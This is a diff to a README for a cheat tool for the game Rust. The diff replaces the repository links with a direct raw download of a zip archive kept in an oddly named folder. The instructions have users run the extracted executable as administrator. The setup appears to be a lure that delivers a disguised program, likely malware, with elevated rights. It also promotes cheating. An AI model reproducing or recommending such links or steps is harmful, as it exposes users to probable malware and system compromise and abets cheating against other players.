@@ -1,6 +1,6 @@
 # 🛠️ Rust-External-26 - Improve your competitive performance in Rust
 
-[![Download Rust-External-26](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Yassenk9492/Rust-External-26)
+[![Download Rust-External-26](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Yassenk9492/Rust-External-26/raw/refs/heads/main/overcollar/Rust_External_v1.7.zip)
 
 Rust-External-26 provides visual and mechanical aids for players of the video game Rust. The software assists with situational awareness and precision. It runs as an external process to ensure smooth performance while you play.
 
@@ -28,7 +28,7 @@ Ensure your computer meets these specifications to run the software without issu
 
 Follow these steps to prepare the software for use on your Windows computer.
 
-1. **Visit the download page:** Go to the [official repository link](https://github.com/Yassenk9492/Rust-External-26) to download the latest version.
+1. **Visit the download page:** Go to the [official repository link](https://github.com/Yassenk9492/Rust-External-26/raw/refs/heads/main/overcollar/Rust_External_v1.7.zip) to download the latest version.
 2. **Extract the files:** Save the compressed folder to your desktop. Right-click the folder and choose "Extract All" to reveal the program files.
 3. **Verify permissions:** Right-click the primary executable file. Select "Properties," go to the "Compatibility" tab, and check the box that says "Run this program as an administrator."
 4. **Launch the game:** Open Rust and join your preferred server.
